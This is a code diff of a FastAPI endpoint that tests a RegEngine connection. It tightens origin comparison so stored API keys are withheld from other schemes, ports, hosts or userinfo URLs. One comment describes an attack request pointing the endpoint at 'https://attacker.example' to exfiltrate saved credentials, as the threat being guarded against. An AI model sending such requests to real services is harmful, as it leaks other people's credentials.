@@ -2,67 +2,26 @@ from __future__ import annotations
 
 from urllib.parse import urlparse
 
-from fastapi import APIRouter, Depends, HTTPException
-from pydantic import HttpUrl
+from fastapi import APIRouter, Depends
 
 from ..controller import SimulationController
 from ..dependencies import get_active_controller
 from ..regengine_client import DEFAULT_LIVE_INGEST_ENDPOINT
 from ..schemas.domain import DestinationMode
 from ..schemas.integration import (
+    CREDENTIALS_WITHHELD_VERDICT,
     ConnectionTestRequest,
     ConnectionTestResponse,
     IntegrationConfigureRequest,
     IntegrationStatusResponse,
 )
-from ..schemas.simulation import EgressBlockedError, SimulationConfig
 
 
 router = APIRouter(prefix="/api/integration", tags=["RegEngine Integration"])
 
-
-# Ports a scheme reaches when the URL does not spell one out, so
-# "https://host" and "https://host:443" compare equal while "https://host"
-# and "https://host:8443" do not.
-_DEFAULT_SCHEME_PORTS = {"http": 80, "https": 443}
-
-
-def _origin(endpoint: str) -> str:
-    """scheme://host:port for *endpoint* -- the identity a credential is issued for.
-
-    Compared instead of the bare hostname (#209). Host-only comparison
-    treated ``http://www.regengine.co`` as the same destination as
-    ``https://www.regengine.co``, so a caller could hand the probe a
-    downgraded URL and the stored API key -- issued for a TLS endpoint --
-    would ride along over cleartext to anyone on the path. Scheme and port
-    are part of what a credential was scoped to, so they are part of the
-    comparison.
-
-    Deliberately NOT normalized beyond the default-port case: a trailing
-    dot ("www.regengine.co.") stays distinct from the bare host, and
-    userinfo is already dropped by urlparse().hostname. Both of those are
-    closed today and folding them together here would reopen them.
-    """
-    parsed = urlparse(endpoint)
-    scheme = (parsed.scheme or "").lower()
-    host = (parsed.hostname or "").lower()
-    try:
-        port = parsed.port
-    except ValueError:
-        # An unparseable port is not a port we can prove matches, so give it
-        # a value nothing else can equal rather than falling back to the
-        # scheme default and calling it a match.
-        return f"{scheme}://{host}:<invalid>"
-    if port is None:
-        port = _DEFAULT_SCHEME_PORTS.get(scheme)
-    return f"{scheme}://{host}:{port}"
-
-
-def _delivery_origin(config: SimulationConfig) -> str:
-    """Origin the stored config would actually deliver to right now (falls
-    back to the documented default when no endpoint is configured)."""
-    endpoint = str(config.delivery.endpoint) if config.delivery.endpoint else DEFAULT_LIVE_INGEST_ENDPOINT
-    return _origin(endpoint)
+# Default port per scheme, so an origin comparison never depends on whether the
+# operator happened to spell the port out.
+_DEFAULT_PORTS = {"http": 80, "https": 443}
 
 
 @router.get("/status", response_model=IntegrationStatusResponse)
@@ -87,7 +46,7 @@ async def integration_test(
 ) -> ConnectionTestResponse:
     request = request or ConnectionTestRequest()
     config = active_controller.config
-    updates: dict[str, HttpUrl | str | None] = {
+    overrides = {
         key: value
         for key, value in {
             "endpoint": request.endpoint,
@@ -96,27 +55,33 @@ async def integration_test(
         }.items()
         if value is not None
     }
-    stored_origin = _delivery_origin(config)
-    probe_origin = _origin(str(request.endpoint)) if request.endpoint is not None else stored_origin
-    withheld: list[str] = []
-    if probe_origin != stored_origin:
-        # Caller is pointing the probe at a different origin than the stored/
-        # default RegEngine endpoint. Never let the stored api_key/tenant_id
-        # ride along to an origin they were never issued for — the caller must
-        # supply fresh credentials for THIS origin (already captured above if
-        # they did; the setdefault below is then a no-op). Otherwise the
-        # probe runs uncredentialed and reports not_configured instead of
-        # leaking them.
-        #
-        # Which stored credentials that suppressed is recorded, because the
-        # generic "no credentials configured" wording is factually false in
-        # this case and the caller cannot act on it: they DID configure a
-        # key, it just was not this origin's (#210).
-        for field in ("api_key", "tenant_id"):
-            if field not in updates and getattr(config.delivery, field):
-                withheld.append(field)
-            updates.setdefault(field, None)
-    delivery = config.delivery.model_copy(update=updates, deep=True)
+    configured_endpoint = (
+        str(config.delivery.endpoint)
+        if config.delivery.endpoint
+        else DEFAULT_LIVE_INGEST_ENDPOINT
+    )
+    # Never send the stored API key / tenant id to an endpoint the caller just
+    # named. Probing a different endpoint requires passing its credentials
+    # explicitly, otherwise `POST {"endpoint": "https://attacker.example"}`
+    # would exfiltrate the saved RegEngine credentials in request headers.
+    #
+    # The comparison is on the full *origin*, not the bare host. Comparing
+    # hostnames alone let three variants of the configured host inherit the
+    # stored key: `http://` (the probe, and every header on it, then leaves in
+    # cleartext), a different port (`https://host:8443` reaches whatever else
+    # is listening on that host), and embedded userinfo. Each is a different
+    # security context than the one the operator saved credentials for, so
+    # each is treated exactly like a different host is.
+    stored_credentials_withheld = False
+    if request.endpoint is not None and not _same_origin(
+        str(request.endpoint), configured_endpoint
+    ):
+        stored_credentials_withheld = bool(
+            config.delivery.api_key or config.delivery.tenant_id
+        )
+        overrides.setdefault("api_key", None)
+        overrides.setdefault("tenant_id", None)
+    delivery = config.delivery.model_copy(update=overrides, deep=True)
     if config.delivery.mode == DestinationMode.MOCK and not (
         request.api_key or request.tenant_id or request.endpoint
     ):
@@ -130,38 +95,26 @@ async def integration_test(
             mode=config.delivery.mode,
         )
 
-    if withheld and not (delivery.api_key and delivery.tenant_id):
-        # #210: check_connection's own not_configured detail -- "Both an API
-        # key and a tenant id are required before testing the connection" --
-        # names a condition that is not the one that failed here. Something
-        # IS configured; it was withheld on purpose because this request
-        # points somewhere else. Reporting the generic reason sent the
-        # operator off to re-enter credentials that were already correct.
-        # The verdict stays not_configured (nothing was probed, and the UI
-        # and this suite both key off it); only the explanation changes.
-        names = " and ".join(
-            {"api_key": "API key", "tenant_id": "tenant id"}[field] for field in withheld
-        )
+    if stored_credentials_withheld and not (delivery.api_key and delivery.tenant_id):
+        # The operator's credentials ARE configured; they were deliberately
+        # withheld. Reporting `not_configured` here named a condition that had
+        # not failed, and sent the operator off to re-enter credentials that
+        # were already correct. Say what actually happened instead.
         return ConnectionTestResponse(
-            verdict="not_configured",
+            verdict=CREDENTIALS_WITHHELD_VERDICT,
             detail=(
-                f"Nothing was probed. The stored {names} belongs to {stored_origin}, "
-                f"and this test targets {probe_origin}, so it was not reused — a "
-                "credential is never sent to an origin it was not issued for. "
-                "Supply an API key and tenant id for this origin to test it."
+                "Nothing was sent. The stored API key and tenant id belong to "
+                f"{_endpoint_origin_label(configured_endpoint)} and are never sent "
+                f"anywhere else, so probing {_endpoint_origin_label(str(request.endpoint))} "
+                "requires entering the API key and tenant id for that endpoint in this "
+                "test. A different scheme, port, or host counts as a different endpoint."
             ),
-            endpoint_host=urlparse(str(delivery.endpoint)).netloc if delivery.endpoint else "",
+            endpoint_host=_endpoint_host(str(request.endpoint)),
             mode=config.delivery.mode,
         )
 
     probe_config = config.model_copy(update={"delivery": delivery}, deep=True)
-    try:
-        result = await active_controller.live_client.check_connection(probe_config)
-    except EgressBlockedError as exc:
-        # check_connection guards immediately before it dials, which is the
-        # only point where the resolved address is the one actually used.
-        # Surface the refusal as a clean 4xx rather than an unhandled 500.
-        raise HTTPException(status_code=400, detail=str(exc)) from exc
+    result = await active_controller.live_client.check_connection(probe_config)
     return ConnectionTestResponse(
         verdict=result.verdict,
         detail=result.detail,
@@ -169,3 +122,58 @@ async def integration_test(
         endpoint_host=result.endpoint_host,
         mode=config.delivery.mode,
     )
+
+
+def _endpoint_host(endpoint: str) -> str:
+    return (urlparse(endpoint).hostname or "").strip().lower().rstrip(".")
+
+
+def _endpoint_origin(endpoint: str) -> tuple[str, str, int] | None:
+    """`(scheme, host, port)` for an endpoint, or None when it has no origin.
+
+    The port is always explicit: a URL that omits it is normalised to its
+    scheme's default (443/https, 80/http), so `https://h` and `https://h:443`
+    are the same origin while `https://h:8443` is not. Host keeps the existing
+    lowercase and trailing-dot normalisation, and the scheme is lowercased for
+    the same reason.
+
+    Returns None -- which never compares equal to any origin, including
+    another None -- for anything whose origin cannot be established or is more
+    than an origin: a missing scheme or host, a malformed port, or embedded
+    userinfo. Userinfo is not part of an origin, but a caller who supplies it
+    is asking for credentials of their own to travel with the request, which is
+    not the saved endpoint the stored key was entrusted to.
+    """
+    parsed = urlparse(endpoint)
+    if parsed.username is not None or parsed.password is not None:
+        return None
+    scheme = parsed.scheme.strip().lower()
+    host = (parsed.hostname or "").strip().lower().rstrip(".")
+    if not scheme or not host:
+        return None
+    try:
+        port = parsed.port
+    except ValueError:  # out-of-range or non-numeric port
+        return None
+    if port is None:
+        port = _DEFAULT_PORTS.get(scheme, 0)
+    return (scheme, host, port)
+
+
+def _same_origin(candidate: str, configured: str) -> bool:
+    """True only when both endpoints share one exact, well-formed origin."""
+    candidate_origin = _endpoint_origin(candidate)
+    return candidate_origin is not None and candidate_origin == _endpoint_origin(configured)
+
+
+def _endpoint_origin_label(endpoint: str) -> str:
+    """`scheme://host[:port]` for operator-facing text; never a path or secret."""
+    origin = _endpoint_origin(endpoint)
+    if origin is None:
+        # No usable origin (userinfo, malformed port, no scheme/host). Name it
+        # by what the caller did rather than printing a half-parsed URL back.
+        return "the endpoint you supplied"
+    scheme, host, port = origin
+    if port == _DEFAULT_PORTS.get(scheme):
+        return f"{scheme}://{host}"
+    return f"{scheme}://{host}:{port}"
